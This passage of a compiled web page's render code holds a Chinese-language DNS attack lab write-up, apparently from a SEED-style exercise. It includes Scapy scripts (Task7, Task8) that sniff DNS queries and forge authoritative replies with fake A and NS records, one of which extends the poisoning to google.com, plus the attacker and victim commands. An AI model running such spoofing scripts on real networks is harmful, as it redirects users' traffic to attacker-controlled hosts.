"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Additional Section")]),s._v("\n        Addsec1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns1.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.7'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        Addsec2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns2.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.8'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 组装 DNS 报文")]),s._v("\n        DNSpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("id")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("id")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" qd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" aa"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                    qr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" qdcount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ancount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" nscount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" arcount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                    an"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Anssec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ns"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("NSsec1"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("NSsec2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ar"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Addsec1"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Addsec2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 组装整个 IP 包")]),s._v("\n        spoofpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" IPpkt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("UDPpkt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("DNSpkt\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 发")]),s._v("\n        send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("spoofpkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Sniff UDP query packets and invoke spoof_dns().")]),s._v("\npkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" sniff"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("filter")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'udp and dst port 53'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" prn"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("spoof_dns"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br"),a("span",{staticClass:"line-number"},[s._v("23")]),a("br"),a("span",{staticClass:"line-number"},[s._v("24")]),a("br"),a("span",{staticClass:"line-number"},[s._v("25")]),a("br"),a("span",{staticClass:"line-number"},[s._v("26")]),a("br"),a("span",{staticClass:"line-number"},[s._v("27")]),a("br"),a("span",{staticClass:"line-number"},[s._v("28")]),a("br"),a("span",{staticClass:"line-number"},[s._v("29")]),a("br"),a("span",{staticClass:"line-number"},[s._v("30")]),a("br"),a("span",{staticClass:"line-number"},[s._v("31")]),a("br")])]),a("p",[s._v("攻击者:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("$ python3 Task7.py\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("受害者:")]),s._v(" "),a("div",{staticClass:"language-sh line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-sh"}},[a("code",[s._v("$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("dig")]),s._v(" www.example.net\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("h2",{attrs:{id:"t8-targeting-another-domain"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#t8-targeting-another-domain"}},[s._v("#")]),s._v(" T8 Targeting Another Domain")]),s._v(" "),a("p",[s._v("添加其他域.")]),s._v(" "),a("p",[a("em",[s._v("Task8.py")])]),s._v(" "),a("div",{staticClass:"language-py line-numbers-mode"},[a("div",{staticClass:"highlight-lines"},[a("br"),a("br"),a("br"),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("div",{staticClass:"highlighted"},[s._v(" ")]),a("br"),a("br"),a("br"),a("br"),a("br"),a("br"),a("br")]),a("pre",{pre:!0,attrs:{class:"language-py"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#!/usr/bin/python")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" scapy"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("all")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("spoof_dns")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("DNS "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pkt "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("and")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'example.net'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qname "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("or")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'google.com'")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qname"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"I am in"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 交换源 IP 和目的 IP")]),s._v("\n        IPpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("dst"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("src"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" src"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("IP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("dst"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 交换源端口和目的端口")]),s._v("\n        UDPpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" UDP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("dport"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("UDP"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sport"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" sport"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("53")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Answer Section")]),s._v("\n        Anssec "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qname"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.6'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Authority Section")]),s._v("\n        NSsec1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns1.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        NSsec2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns2.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        NSsec3 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'google.com'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns1.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        NSsec4 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'google.com'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'NS'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns2.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# The Additional Section")]),s._v("\n        Addsec1 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns1.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.7'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" \n        Addsec2 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNSRR"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("rrname"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'ns2.example.net'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                        "),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("type")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'A'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ttl"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("259200")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rdata"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1.2.3.8'")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 组装 DNS 报文")]),s._v("\n        DNSpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("id")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("id")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" qd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("pkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("DNS"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("qd"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" aa"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" rd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                    qr"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" qdcount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ancount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" nscount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("4")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" arcount"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" \n                    an"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Anssec"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ns"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("NSsec1"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("NSsec2"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("NSsec3"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("NSsec4"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ar"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("Addsec1"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Addsec2"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 组装整个 IP 包")]),s._v("\n        spoofpkt "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" IPpkt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("UDPpkt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("DNSpkt\n        "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 发")]),s._v("\n        send"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("spoofpkt"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# Sniff 